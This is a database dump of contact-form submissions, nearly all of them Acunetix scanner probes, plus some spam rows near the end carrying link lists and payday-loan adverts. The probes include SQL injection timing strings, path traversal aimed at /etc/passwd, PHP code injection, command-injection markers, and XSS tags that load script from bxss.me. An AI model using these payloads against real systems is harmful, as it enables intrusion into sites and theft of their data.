INSERT INTO `tb_contact` VALUES (173, '\'set|set&set\' jfrwbtmi', '\'set|set&set\'', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (174, 'Acunetix chnyjxlo', 'Acunetix', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (175, 'Acunetix tmcytivq', 'Acunetix', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (176, 'Acunetix cwmqbogc', 'Acunetix', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (177, 'Acunetix Acunetix\nbcc:!r6.2-83.2.4be0b.1@bxss.me', 'Acunetix', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (178, 'Acunetix kdfnbpng', 'Acunetix', 'response.write(9974406*9650559)', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (179, 'Acunetix ZXYwdTlrWkk=', 'Acunetix', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (180, 'Acunetix kdfnbpng', 'Acunetix', '\'+response.write(9974406*9650559)+\'', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (181, 'sample@email.tst uxionjec', 'sample@email.tst', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (182, '\"set|set&set\" jfrwbtmi', '\"set|set&set\"', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (183, 'Acunetix kdfnbpng', 'Acunetix', '\"+response.write(9974406*9650559)+\"', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (184, 'set|set&set jfrwbtmi', 'set|set&set', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (185, 'Acunetix Acunetix\'>\"><script src=http://bxss.me/s?u=!r6&r=2-88&h=2-4be0b-1></script>', 'Acunetix', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (186, 'Acunetix 12345\'\"\\\'\\\");|]*{\r\n<>\'\'????', 'Acunetix', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (187, 'Acunetix cwmqbogc', 'Acunetix', '1', 'cwmqbogc\'>\"><script src=http://bxss.me/s?u=!r6&r=2-91&h=2-4be0b-1></script>', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (188, 'Acunetix cbpdqiyj', 'Acunetix', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (189, 'Acunetix cwmqbogc', 'Acunetix', '1', 'cwmqbogc\" onmouseover=\"var h=document.getElementsByTagName(\'head\')[0];var s=document.createElement(\'script\');s.type=\'text/javascript\';s.src=\'http://bxss.me/s?u=!r6&r=2-92&h=2-4be0b-2\';h.appendChild(s);\" style=\"display:block;width:2000px;height:2000px;\" bad=\"', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (190, 'Acunetix nxxwlqvt', 'Acunetix', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (191, 'sample%40email.tst goupqtnn', 'sample%40email.tst', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (192, 'Acunetix jvtujlbs', 'Acunetix', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (193, 'Acunetix qraaebbj', 'Acunetix', '1', '${@print(md5(acunetix_wvs_security_test))}', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (194, 'Acunetix qraaebbj', 'Acunetix', '1', '${@print(md5(acunetix_wvs_security_test))}\\', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (195, 'Acunetix qraaebbj', 'Acunetix', '${@print(md5(acunetix_wvs_security_test))}', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (196, 'Acunetix qraaebbj', 'Acunetix', '${@print(md5(acunetix_wvs_security_test))}\\', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (197, 'Acunetix tmcytivq', 'Acunetix', '1', 'dDEOU3MN\'); waitfor delay \'0:0:9\' --', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (198, 'Acunetix tmcytivq', 'Acunetix', '1', 'b0hfWo3g\';select pg_sleep(3); --', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (199, 'Acunetix jvtujlbs', 'Acunetix', '1', '\\', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (200, 'Acunetix pepgkowq', 'Acunetix', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (201, 'Acunetix pepgkowq', 'Acunetix', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (202, 'Acunetix pepgkowq', 'Acunetix', '/etc/passwd', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (203, 'Acunetix pepgkowq', 'Acunetix', '../..//../..//../..//../..//../..//../..//../..//../..//etc/passwd', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (204, 'Acunetix pepgkowq', 'Acunetix', 'invalid../../../../../../../../../../etc/passwd/././././././././././././././././././././././././././', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (205, 'Acunetix tmcytivq', 'Acunetix', 'j9lbM1Ac\'));select pg_sleep(9); --', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (206, 'Acunetix ojgouhqv', 'Acunetix', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (207, 'Acunetix ojgouhqv', 'Acunetix', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (208, 'Acunetix ojgouhqv', 'Acunetix', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (209, 'Acunetix ojgouhqv', 'Acunetix', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (210, 'Acunetix ojgouhqv', 'Acunetix', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (211, 'Acunetix ojgouhqv', 'Acunetix', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (212, 'Acunetix ojgouhqv', 'Acunetix', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (213, 'Acunetix ojgouhqv', 'Acunetix', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (214, 'Acunetix ojgouhqv', 'Acunetix', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (215, 'Acunetix ojgouhqv', 'Acunetix', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (216, 'Acunetix ojgouhqv', 'Acunetix', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (217, 'Acunetix ojgouhqv', 'Acunetix', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (218, 'Acunetix ojgouhqv', 'Acunetix', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (219, 'Acunetix ojgouhqv', 'Acunetix', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (220, 'Acunetix ojgouhqv', 'Acunetix', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (221, '1acuUD3tFCt1PS txywlgvt', '1acuUD3tFCt1PS', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (222, 'Acunetix 1acuIhzV3jakfo', 'Acunetix', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (223, 'Acunetix txywlgvt', 'Acunetix', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (224, 'Acunetix yufdmnko', 'Acunetix', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (225, 'Acunetix \"+response.write(9231812*9163809)+\"', 'Acunetix', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (226, 'Acunetix qevfjhmw', 'Acunetix', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (227, 'Acunetix qevfjhmw', 'Acunetix', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (228, 'Acunetix mbckvaul', 'Acunetix', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (229, 'Acunetix !(()&&!|*|*|', 'Acunetix', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (230, 'Acunetix axsolohy', 'Acunetix', '1', '!(()&&!|*|*|', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (231, 'Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAucG5n hdnhxdag', 'Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAucG5n', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (232, 'Acunetix kchcqaee', 'Acunetix', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (233, '..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00.tst hdnhxdag', '..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00.tst', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (234, 'Acunetix oqxygnyi', 'Acunetix', '1', '\'\"()', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (235, '/etc/passwd hdnhxdag', '/etc/passwd', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (236, '(select(0)from(select(sleep(10)))v)/*\'+(select(0)from(select(sleep(10)))v)+\'\"+(select(0)from(select(', '(select(0)from(select(sleep(10)))v)/*\'+(select(0)from(select(sleep(10)))v)+\'\"+(select(0)from(select(', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (237, '1 waitfor delay \'0:0:10\' -- qpbitmfe', '1 waitfor delay \'0:0:10\' --', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (238, 'Acunetix muiqigeu', 'Acunetix', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (239, '9qUcIIMB\')); waitfor delay \'0:0:3\' -- qpbitmfe', '9qUcIIMB\')); waitfor delay \'0:0:3\' --', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (240, 'Acunetix kchcqaee', 'Acunetix', '\";print(md5(acunetix_wvs_security_test));$a=\"', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (241, 'Acunetix 12345\'\"\\\'\\\");|]*{\r\n<>\'\'????', 'Acunetix', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (242, 'Acunetix vpvldskf', 'Acunetix', '1', 'vpvldskf', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (243, 'Acunetix qpbitmfe', 'Acunetix', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (244, 'Acunetix qpbitmfe', 'Acunetix', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (245, 'Acunetix qpbitmfe', 'Acunetix', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (246, 'Acunetix omchkqok', 'Acunetix', '(select convert(int,CHAR(65)))', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (247, 'Acunetix qpbitmfe', 'Acunetix', 'qf5ZDcZQ', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (248, 'Acunetix qpbitmfe', 'Acunetix', '555-666-0606\' AND 2+1-1-1=0+0+0+1 AND \'aS8w\'=\'aS8w', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (249, 'Acunetix qpbitmfe', 'Acunetix', '(select(0)from(select(sleep(9)))v)/*\'+(select(0)from(select(sleep(9)))v)+\'\"+(select(0)from(select(sl', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (250, 'Acunetix qpbitmfe', 'Acunetix', 'MGfJ81To\'); waitfor delay \'0:0:3\' --', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (251, 'Acunetix qpbitmfe', 'Acunetix', 'wtroitDN\')); waitfor delay \'0:0:6\' --', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (252, 'Acunetix qpbitmfe', 'Acunetix', 'bLg1cGph\'));select pg_sleep(6); --', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (253, 'Acunetix yufdmnko', 'Acunetix', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (254, 'Acunetix yufdmnko', 'Acunetix', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (255, 'Acunetix yufdmnko', 'Acunetix', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (256, 'Acunetix yufdmnko', 'Acunetix', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (257, 'Acunetix yufdmnko', 'Acunetix', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (258, 'Acunetix yufdmnko', 'Acunetix', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (259, 'Acunetix yufdmnko', 'Acunetix', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (260, 'Acunetix yufdmnko', 'Acunetix', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (261, 'Acunetix yufdmnko', 'Acunetix', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (262, 'Acunetix yufdmnko', 'Acunetix', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (263, 'Acunetix yufdmnko', 'Acunetix', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (264, 'Acunetix yufdmnko', 'Acunetix', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (265, 'Acunetix yufdmnko', 'Acunetix', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (266, 'Acunetix yufdmnko', 'Acunetix', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (267, 'Acunetix yufdmnko', 'Acunetix', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (268, 'Acunetix yufdmnko', 'Acunetix', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (269, 'Acunetix yufdmnko', 'Acunetix', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (270, 'Acunetix yufdmnko', 'Acunetix', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (271, 'Acunetix yufdmnko', 'Acunetix', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (272, 'Acunetix yufdmnko', 'Acunetix', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (273, 'Acunetix yufdmnko', 'Acunetix', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (274, 'Acunetix yufdmnko', 'Acunetix', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (275, '1acuLhi8EgsojF kijcbrgb', '1acuLhi8EgsojF', '1', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (276, 'Acunetix kijcbrgb', 'Acunetix', '1acu7KEB02FTpd', '1', '36.82.102.145', '0000-00-00');
INSERT INTO `tb_contact` VALUES (277, 'bfxNqGMxPCVtGcb AhenWaGr', 'bfxNqGMxPCVtGcb', 'OcYidBWDozlDhlrxw', 'rd81jo  <a href=\"http://hyacwwfnuvsx.com/\">hyacwwfnuvsx</a>, [url=http://ahfpboqbevzl.com/]ahfpboqbevzl[/url], [link=http://xehulfplnlgx.com/]xehulfplnlgx[/link], http://zqyixfyopkhn.com/', '46.161.9.57', '0000-00-00');
INSERT INTO `tb_contact` VALUES (278, 'Acunetix ucsytclm', 'Acunetix', '1', '1', '36.82.102.4', '0000-00-00');
INSERT INTO `tb_contact` VALUES (279, 'sample%40email.tst\" onmouseover=\"var h=document.getElementsByTagName(\'head\')[0];var s=document.creat', 'sample%40email.tst\" onmouseover=\"var h=document.getElementsByTagName(\'head\')[0];var s=document.creat', '1', '1', '36.82.102.4', '0000-00-00');
INSERT INTO `tb_contact` VALUES (280, 'Acunetix pocxvylq', 'Acunetix', '1', '\'+response.write(9384488*9315723)+\'', '36.82.102.4', '0000-00-00');
INSERT INTO `tb_contact` VALUES (281, 'Acunetix fjfdplio', 'Acunetix', '1', '1', '36.82.102.4', '0000-00-00');
INSERT INTO `tb_contact` VALUES (282, 'Acunetix poascvga', 'Acunetix', '1', 'poascvga\'>\"><script src=http://bxss.me/s?u=!r6&r=8-91&h=8-2f095-1></script>', '36.82.102.4', '0000-00-00');
INSERT INTO `tb_contact` VALUES (283, '${@print(md5(acunetix_wvs_security_test))} dwdddsmk', '${@print(md5(acunetix_wvs_security_test))}', '1', '1', '36.82.102.4', '0000-00-00');
INSERT INTO `tb_contact` VALUES (284, 'Acunetix pocxvylq', 'Acunetix', '1', '\"+response.write(9384488*9315723)+\"', '36.82.102.4', '0000-00-00');
INSERT INTO `tb_contact` VALUES (285, 'Acunetix qsfceebf', 'Acunetix', '1', '1', '36.82.102.4', '0000-00-00');
INSERT INTO `tb_contact` VALUES (286, 'Acunetix `set|set&set`', 'Acunetix', '1', '1', '36.82.102.4', '0000-00-00');
INSERT INTO `tb_contact` VALUES (287, 'Acunetix juemibbe', 'Acunetix', '1', '1', '36.82.102.4', '0000-00-00');
INSERT INTO `tb_contact` VALUES (288, 'Acunetix /etc/passwd', 'Acunetix', '1', '1', '36.82.102.4', '0000-00-00');
INSERT INTO `tb_contact` VALUES (289, '${@print(md5(acunetix_wvs_security_test))}\\ dwdddsmk', '${@print(md5(acunetix_wvs_security_test))}\\', '1', '1', '36.82.102.4', '0000-00-00');
INSERT INTO `tb_contact` VALUES (290, 'Acunetix qsfceebf', 'Acunetix', '1', '1', '36.82.102.4', '0000-00-00');
INSERT INTO `tb_contact` VALUES (291, 'Acunetix ;print(md5(acunetix_wvs_security_test));', 'Acunetix', '1', '1', '36.82.102.4', '0000-00-00');
INSERT INTO `tb_contact` VALUES (292, 'Acunetix \';print(md5(acunetix_wvs_security_test));$a=\'', 'Acunetix', '1', '1', '36.82.102.4', '0000-00-00');
INSERT INTO `tb_contact` VALUES (293, '\'\"() qsfceebf', '\'\"()', '1', '1', '36.82.102.4', '0000-00-00');
INSERT INTO `tb_contact` VALUES (294, 'Acunetix dwdddsmk', 'Acunetix', '\";print(md5(acunetix_wvs_security_test));$a=\"', '1', '36.82.102.4', '0000-00-00');
INSERT INTO `tb_contact` VALUES (295, 'Acunetix tjndqlbi', 'Acunetix', '1', '1', '36.82.102.4', '0000-00-00');
INSERT INTO `tb_contact` VALUES (296, '<!-- dxehnkic', '<!--', '1', '1', '36.82.102.4', '0000-00-00');
INSERT INTO `tb_contact` VALUES (297, 'Acunetix Acunetix', 'Acunetix', '1', '1', '36.82.102.4', '0000-00-00');
INSERT INTO `tb_contact` VALUES (298, 'Acunetix bagewaow', 'Acunetix', 'JyI=', '1', '36.82.102.4', '0000-00-00');
INSERT INTO `tb_contact` VALUES (299, 'Acunetix bagewaow', 'Acunetix', '\'\"', '1', '36.82.102.4', '0000-00-00');
INSERT INTO `tb_contact` VALUES (300, 'http://hitZkww0UVIuC.bxss.me/ vegoewwa', 'http://hitZkww0UVIuC.bxss.me/', '1', '1', '36.82.102.4', '0000-00-00');
INSERT INTO `tb_contact` VALUES (301, 'Acunetix vegoewwa', 'Acunetix', 'http://hituUyxDAUfwI.bxss.me/', '1', '36.82.102.4', '0000-00-00');
INSERT INTO `tb_contact` VALUES (302, 'Acunetix juemibbe', 'Acunetix', '1', '1', '36.82.102.4', '0000-00-00');
INSERT INTO `tb_contact` VALUES (303, 'Acunetix `set|set&set`', 'Acunetix', '1', '1', '36.82.102.4', '0000-00-00');
INSERT INTO `tb_contact` VALUES (304, 'Acunetix pocxvylq', 'Acunetix', '1', '\"+response.write(9384488*9315723)+\"', '36.82.102.4', '0000-00-00');
INSERT INTO `tb_contact` VALUES (305, 'Acunetix juemibbe', 'Acunetix', 'SomeCustomInjectedHeader:injected_by_wvs', '1', '36.82.102.4', '0000-00-00');
INSERT INTO `tb_contact` VALUES (306, 'Acunetix ;set|set&set;', 'Acunetix', '1', '1', '36.82.102.4', '0000-00-00');
INSERT INTO `tb_contact` VALUES (307, 'Acunetix pocxvylq', 'Acunetix', '1', '1', '36.82.102.4', '0000-00-00');
INSERT INTO `tb_contact` VALUES (308, 'Acunetix teirekpc', 'Acunetix', '1', 'set|set&set', '36.82.102.4', '0000-00-00');
INSERT INTO `tb_contact` VALUES (309, 'Acunetix pocxvylq', 'Acunetix', 'response.write(9207421*9777562)', '1', '36.82.102.4', '0000-00-00');
INSERT INTO `tb_contact` VALUES (310, 'Acunetix pocxvylq', 'Acunetix', '\'+response.write(9207421*9777562)+\'', '1', '36.82.102.4', '0000-00-00');
INSERT INTO `tb_contact` VALUES (311, 'Acunetix teirekpc', 'Acunetix', '1', '\"set|set&set\"', '36.82.102.4', '0000-00-00');
INSERT INTO `tb_contact` VALUES (312, 'Acunetix teirekpc', 'Acunetix', '1', 'set|set&set', '36.82.102.4', '0000-00-00');
INSERT INTO `tb_contact` VALUES (313, 'Acunetix pocxvylq', 'Acunetix', '\"+response.write(9207421*9777562)+\"', '1', '36.82.102.4', '0000-00-00');
INSERT INTO `tb_contact` VALUES (314, 'Acunetix juemibbe', 'Acunetix', 'SomeCustomInjectedHeader:injected_by_wvs', '1', '36.82.102.4', '0000-00-00');
INSERT INTO `tb_contact` VALUES (315, 'Acunetix teirekpc', 'Acunetix', '1', '`set|set&set`', '36.82.102.4', '0000-00-00');
INSERT INTO `tb_contact` VALUES (316, 'Acunetix teirekpc', 'Acunetix', '1', ';set|set&set;', '36.82.102.4', '0000-00-00');
INSERT INTO `tb_contact` VALUES (317, 'Acunetix /etc/passwd', 'Acunetix', '1', '1', '36.82.102.4', '0000-00-00');
INSERT INTO `tb_contact` VALUES (318, 'Acunetix teirekpc', 'Acunetix', '1', '1', '36.82.102.4', '0000-00-00');
INSERT INTO `tb_contact` VALUES (319, 'Acunetix teirekpc', 'Acunetix', '1', '1', '36.82.102.4', '0000-00-00');
INSERT INTO `tb_contact` VALUES (320, 'Acunetix teirekpc', 'Acunetix', '1', '1', '36.82.102.4', '0000-00-00');
INSERT INTO `tb_contact` VALUES (321, 'Acunetix teirekpc', 'Acunetix', '1', '1', '36.82.102.4', '0000-00-00');
INSERT INTO `tb_contact` VALUES (322, 'Acunetix ../..//../..//../..//../..//../..//../..//../..//../..//etc/passwd', 'Acunetix', '1', '1', '36.82.102.4', '0000-00-00');
INSERT INTO `tb_contact` VALUES (323, 'Acunetix ../.../.././../.../.././../.../.././../.../.././../.../.././../.../.././etc/passwd', 'Acunetix', '1', '1', '36.82.102.4', '0000-00-00');
INSERT INTO `tb_contact` VALUES (324, 'Acunetix teirekpc', 'Acunetix', '1', '1', '36.82.102.4', '0000-00-00');
INSERT INTO `tb_contact` VALUES (325, 'Acunetix poascvga', 'Acunetix', '555-666-0606\'>\"><script src=http://bxss.me/s?u=!r6&r=8-110&h=8-2f095-1></script>', '1', '36.82.102.4', '0000-00-00');
INSERT INTO `tb_contact` VALUES (326, 'Acunetix teirekpc', 'Acunetix', '\"set|set&set\"', '1', '36.82.102.4', '0000-00-00');
INSERT INTO `tb_contact` VALUES (327, 'Acunetix teirekpc', 'Acunetix', 'set|set&set', '1', '36.82.102.4', '0000-00-00');
INSERT INTO `tb_contact` VALUES (328, 'Acunetix wtfomsfk', 'Acunetix', '1', 'Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAucG5n', '36.82.102.4', '0000-00-00');
INSERT INTO `tb_contact` VALUES (329, 'Acunetix wtfomsfk', 'Acunetix', '1', '..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00.jpg', '36.82.102.4', '0000-00-00');
INSERT INTO `tb_contact` VALUES (330, 'Acunetix wtfomsfk', 'Acunetix', '1', '/../..//../..//../..//../..//../..//etc/passwd.jpg', '36.82.102.4', '0000-00-00');
INSERT INTO `tb_contact` VALUES (331, 'Acunetix wtfomsfk', 'Acunetix', '1', '.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./etc/passwd', '36.82.102.4', '0000-00-00');
INSERT INTO `tb_contact` VALUES (332, 'Acunetix wtfomsfk', 'Acunetix', '1', '1', '36.82.102.4', '0000-00-00');
INSERT INTO `tb_contact` VALUES (333, 'Acunetix wtfomsfk', 'Acunetix', '1', '1', '36.82.102.4', '0000-00-00');
INSERT INTO `tb_contact` VALUES (334, 'Acunetix wtfomsfk', 'Acunetix', '../../../../../../../../../../etc/passwd', '1', '36.82.102.4', '0000-00-00');
INSERT INTO `tb_contact` VALUES (335, 'Acunetix wtfomsfk', 'Acunetix', '../..//../..//../..//../..//../..//../..//../..//../..//etc/passwd', '1', '36.82.102.4', '0000-00-00');
INSERT INTO `tb_contact` VALUES (336, 'Acunetix ucsytclm', 'Acunetix', '1', '1', '36.82.102.4', '0000-00-00');
INSERT INTO `tb_contact` VALUES (337, 'Acunetix ucsytclm', 'Acunetix', '1', '1', '36.82.102.4', '0000-00-00');
INSERT INTO `tb_contact` VALUES (338, 'Acunetix isaufyao', 'Acunetix', '1', '1', '36.82.102.4', '0000-00-00');
INSERT INTO `tb_contact` VALUES (339, 'Acunetix isaufyao', 'Acunetix', '1', '1acuwrUDr9YEwU', '36.82.102.4', '0000-00-00');
INSERT INTO `tb_contact` VALUES (340, 'Acunetix 1acu2UvHXqWSZf', 'Acunetix', '1', '1', '36.82.102.4', '0000-00-00');
INSERT INTO `tb_contact` VALUES (341, 'Acunetix isaufyao', 'Acunetix', '1acuNz6uidM6iP', '1', '36.82.102.4', '0000-00-00');
INSERT INTO `tb_contact` VALUES (342, '1acuis5WFFvuxq isaufyao', '1acuis5WFFvuxq', '1', '1', '36.82.102.4', '0000-00-00');
INSERT INTO `tb_contact` VALUES (343, 'PoRapoRIqihFfZwiS VDRShMpZywoSLos', 'PoRapoRIqihFfZwiS', 'cItWIdcLpP', 'qisi80  <a href=\"http://iataxmvevdjc.com/\">iataxmvevdjc</a>, [url=http://rhzbdvnjnxdf.com/]rhzbdvnjnxdf[/url], [link=http://zlfzuubfhxiw.com/]zlfzuubfhxiw[/link], http://mojwxobqptpu.com/', '46.161.9.57', '0000-00-00');
INSERT INTO `tb_contact` VALUES (344, 'ZNDWPSPsLgaCHyx wyCTKtbkvkdGRVa', 'ZNDWPSPsLgaCHyx', 'VCHhFqsscSsIAGzHmE', 'uFtqds  <a href=\"http://qfanebtoycnz.com/\">qfanebtoycnz</a>, [url=http://fqffbcjguuyt.com/]fqffbcjguuyt[/url], [link=http://ewncffqofiig.com/]ewncffqofiig[/link], http://asycfuckhljp.com/', '178.159.37.111', '0000-00-00');
INSERT INTO `tb_contact` VALUES (345, 'nboSOMNmtPZmc RqSLNQOOCtqufqXarwl', 'nboSOMNmtPZmc', 'fYWdMSHWUDqBSdBhyoq', 'WYfkxB  <a href=\"http://xpqhcppsqqjz.com/\">xpqhcppsqqjz</a>, [url=http://tdgqhcaoftpc.com/]tdgqhcaoftpc[/url], [link=http://iphvmwwvjryz.com/]iphvmwwvjryz[/link], http://aqttsmoacnyf.com/', '46.161.9.57', '0000-00-00');
INSERT INTO `tb_contact` VALUES (346, 'noylfebewBJ nnnkcpbewBJ', 'noylfebewBJ', 'buying viagra online', 'payday loans online direct lenders only <a href=\"http://cashadvances2017.com\"> payday loans direct lender</a> &lt;a href=&quot;http://cashadvances2017.com&quot;&gt; payday loans&lt;/a&gt; <a href=http://cashadvances2017.com>best payday loans</a>  no credit check payday loans', '46.161.9.3', '0000-00-00');
INSERT INTO `tb_contact` VALUES (347, 'pQPPCYhJmxOrjcan uWRbHWfNME', 'pQPPCYhJmxOrjcan', 'DufJmggeTH', 'Nmm47s  <a href=\"http://kgzwrtimkogu.com/\">kgzwrtimkogu</a>, [url=http://jeoinkihckaz.com/]jeoinkihckaz[/url], [link=http://ycsfamlwhanh.com/]ycsfamlwhanh[/link], http://bxagwrrogahm.com/', '178.159.37.111', '0000-00-00');
